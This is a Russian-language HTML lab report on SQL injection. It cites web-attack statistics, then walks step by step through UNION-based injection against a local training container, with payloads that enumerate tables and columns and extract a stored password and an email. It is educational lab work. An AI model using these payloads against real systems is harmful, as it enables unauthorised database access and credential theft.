@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Лабораторная работа №1</title>
+<style>
+  body { font-family: Arial, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 20px; color: #222; line-height: 1.6; }
+  h1 { border-bottom: 2px solid #333; padding-bottom: 8px; }
+  h2 { border-bottom: 1px solid #ccc; padding-bottom: 4px; margin-top: 40px; }
+  h3 { margin-top: 28px; }
+  table { border-collapse: collapse; width: 100%; margin: 16px 0; }
+  th, td { border: 1px solid #ccc; padding: 8px 12px; text-align: left; }
+  th { background: #f0f0f0; font-weight: bold; }
+  code { background: #f5f5f5; padding: 2px 5px; border-radius: 3px; font-family: monospace; }
+  pre { background: #f5f5f5; padding: 14px; border-radius: 5px; overflow-x: auto; }
+  pre code { background: none; padding: 0; }
+  hr { border: none; border-top: 1px solid #ddd; margin: 32px 0; }
+  blockquote { border-left: 4px solid #ccc; margin: 0; padding-left: 16px; color: #555; }
+</style>
+</head>
+<body>
+<h1>Лабораторная работа №1. SQL-инъекции</h1>
+<h2>Часть 1. Статистика веб-уязвимостей</h2>
+<h3>Источники</h3>
+<ol>
+<li>Verizon DBIR 2025 — https://www.verizon.com/business/resources/T16f/reports/2025-dbir-data-breach-investigations-report.pdf</li>
+<li>OWASP Top 10 2025 — https://owasp.org/Top10/2025/</li>
+<li>IBM X-Force Threat Intelligence Index 2025 — https://www.ibm.com/reports/threat-intelligence</li>
+<li>Google Cloud M-Trends 2025 — https://archive.orkl.eu/485ca080f5d6a75a30057719950065ba80882705.pdf</li>
+<li>BI.ZONE WAF — https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/</li>
+</ol>
+<hr />
+<h3>Доля успешных атак через эксплуатацию веб-уязвимостей</h3>
+<p>Найти единую метрику именно для веб-уязвимостей затруднительно: большинство источников оперируют более широкими категориями. Ниже приведена сводка по нескольким авторитетным отчётам.</p>
+<table>
+<thead>
+<tr>
+<th>Источник</th>
+<th>Scope</th>
+<th>Доля атак через веб</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Verizon DBIR 2025</strong></td>
+<td>Подтверждённые breaches, глобально, 2023–2024</td>
+<td>20% breaches — через эксплуатацию уязвимостей (включая VPN/edge); ~8% относятся именно к паттерну Basic Web Application Attacks</td>
+</tr>
+<tr>
+<td><strong>IBM X-Force 2025</strong></td>
+<td>IR-кейсы за 2024</td>
+<td>30% инцидентов включали эксплуатацию публично доступных приложений</td>
+</tr>
+<tr>
+<td><strong>Google M-Trends 2025</strong></td>
+<td>Mandiant IR за 2024</td>
+<td>33% — эксплуатация уязвимостей как initial vector (в целом); «Web compromise» отдельно — 9%</td>
+</tr>
+<tr>
+<td><strong>BI.ZONE WAF</strong></td>
+<td>Атаки на веб-приложения российских компаний, 2024</td>
+<td>Статистика по типам атак (не по breaches): RCE — 36%, path traversal — 16%, XSS — 14%, SQLi — 10%</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Вывод:</strong> в зависимости от методологии и охвата исследования доля атак через веб-уязвимости составляет от ~8% до 30% от общего числа успешных инцидентов. Разброс обусловлен различиями в том, что именно считается «веб-атакой» (только приложения vs. включая edge/VPN).</p>
+<hr />
+<h3>Распределение по конкретным уязвимостям</h3>
+<p>По данным OWASP Top 10 2025 (наиболее актуальный публичный рейтинг веб-уязвимостей):</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Категория</th>
+<th>Incidence Rate</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Broken Access Control</td>
+<td>3.74%</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Security Misconfiguration</td>
+<td>3.00%</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Software Supply Chain Failures</td>
+<td>5.72%</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cryptographic Failures</td>
+<td>3.80%</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Injection (SQLi, CMDi и др.)</td>
+<td>3.08%</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Insecure Design</td>
+<td>1.86%</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Authentication Failures</td>
+<td>2.92%</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Software/Data Integrity Failures</td>
+<td>2.75%</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Security Logging Failures</td>
+<td>3.91%</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Mishandling of Exceptional Conditions</td>
+<td>2.95%</td>
+</tr>
+</tbody>
+</table>
+<p>По телеметрии BI.ZONE WAF (российский сегмент, 2024):
+- <strong>RCE</strong> — 36% всех веб-атак (из них OS command injection — 46%, LFI/RFI — 40%)
+- <strong>Path traversal / доступ к конфигам</strong> — 16%
+- <strong>XSS и кража данных</strong> — 14%
+- <strong>SQL-инъекции</strong> — 10%</p>
+<hr />
+<h2>Часть 2. Практическое задание: SQL-инъекция</h2>
+<h3>Подготовка</h3>
+<p>Запустил Docker-контейнер, перешёл на <code>http://localhost:8080</code>. Страница предлагает ввести <code>id</code>.</p>
+<hr />
+<h3>Шаг 1. Разведка — перебор id</h3>
+<p>Начал с очевидного запроса:</p>
+<pre><code>http://localhost:8080/task/?id=1
+→ Ваш id:1  Ваш логин:admin
+</code></pre>
+<p>Для быстрого перебора использовал цикл в bash:</p>
+<pre><code class="language-bash">for i in $(seq 0 20); do
+  echo -n &quot;ID $i: &quot; &amp;&amp; curl -s &quot;http://localhost:8080/task/?id=$i&quot;
+  echo
+done
+</code></pre>
+<p>Получил полный список пользователей:</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>login</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Volk</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Matroskin</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Vinni-pukh</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Neznaika</td>
+</tr>
+<tr>
+<td>6</td>
+<td>kotenok</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Karlson</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Kesha</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Volk2</td>
+</tr>
+</tbody>
+</table>
+<p>Записи с id ≥ 10 возвращают пустой ответ — всего 9 пользователей.</p>
+<hr />
+<h3>Шаг 2. Проверка наличия уязвимости</h3>
+<p>Добавил одинарную кавычку к запросу:</p>
+<pre><code>http://localhost:8080/task/?id=1'
+→ You have an error in your SQL syntax; check the manual that corresponds 
+  to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</code></pre>
+<p>Сервер вернул сырую ошибку MySQL — уязвимость к SQL-инъекции подтверждена. Из текста ошибки видна структура запроса: <code>... WHERE id='1' LIMIT 0,1</code>.</p>
+<hr />
+<h3>Шаг 3. Определение количества столбцов (ORDER BY)</h3>
+<p>Подбираю число столбцов через <code>ORDER BY</code>:</p>
+<pre><code>http://localhost:8080/task/?id=0'+ORDER+BY+1--+-  → ок
+http://localhost:8080/task/?id=0'+ORDER+BY+2--+-  → ок
+http://localhost:8080/task/?id=0'+ORDER+BY+3--+-  → ок
+http://localhost:8080/task/?id=0'+ORDER+BY+4--+-  → Unknown column '4' in 'order clause'
+</code></pre>
+<p><strong>Вывод:</strong> в запросе 3 столбца.</p>
+<hr />
+<h3>Шаг 4. Получение имени базы данных</h3>
+<p>Использую несуществующий id (0), чтобы вывод был пустым и UNION подставил свои данные:</p>
+<pre><code>http://localhost:8080/task/?id=0'+UNION+SELECT+1,2,3--+-
+→ Ваш id:1  Ваш логин:2
+</code></pre>
+<p>Поле <code>id</code> соответствует столбцу 1, поле <code>логин</code> — столбцу 2. Подставляю <code>database()</code>:</p>
+<pre><code>http://localhost:8080/task/?id=0'+UNION+SELECT+1,database(),3--+-
+→ Ваш id:1  Ваш логин:security
+</code></pre>
+<p><strong>Имя базы данных: <code>security</code></strong></p>
+<hr />
+<h3>Шаг 5. Получение списка таблиц</h3>
+<pre><code>http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(table_name+SEPARATOR+','),3
+  +FROM+information_schema.tables+WHERE+table_schema=database()--+-
+→ Ваш логин:emails,users
+</code></pre>
+<p><strong>В базе две таблицы: <code>emails</code>, <code>users</code></strong></p>
+<hr />
+<h3>Шаг 6. Получение структуры таблиц</h3>
+<p><strong>Таблица <code>users</code>:</strong></p>
+<pre><code>http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3
+  +FROM+information_schema.columns+WHERE+table_name='users'--+-
+→ Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+</code></pre>
+<p>Нужные столбцы: <code>id</code>, <code>username</code>, <code>password</code>.</p>
+<p><strong>Таблица <code>emails</code>:</strong></p>
+<pre><code>http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3
+  +FROM+information_schema.columns+WHERE+table_name='emails'--+-
+→ Ваш логин:id,email_id
+</code></pre>
+<hr />
+<h3>Шаг 7. Извлечение целевых данных</h3>
+<p><strong>Пароль пользователя Volk2 (id=9):</strong></p>
+<pre><code>http://localhost:8080/task/?id=0'+UNION+SELECT+1,password,3+FROM+users+WHERE+id=9--+-
+→ Ваш логин:Wa spoiuuuuu
+</code></pre>
+<p><strong>Email пользователя Vinni-pukh (id=4):</strong></p>
+<pre><code>http://localhost:8080/task/?id=0'+UNION+SELECT+1,email_id,3+FROM+emails+WHERE+id=4--+-
+→ Ваш логин:honey_lover@otus-lab.com
+</code></pre>
+<hr />
+<h3>Итог</h3>
+<table>
+<thead>
+<tr>
+<th>Задание</th>
+<th>Ответ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Пароль пользователя <strong>Volk2</strong></td>
+<td><code>Wa spoiuuuuu</code></td>
+</tr>
+<tr>
+<td>Email пользователя <strong>Vinni-pukh</strong></td>
+<td><code>honey_lover@otus-lab.com</code></td>
+</tr>
+</tbody>
+</table>
+</body>
+</html>
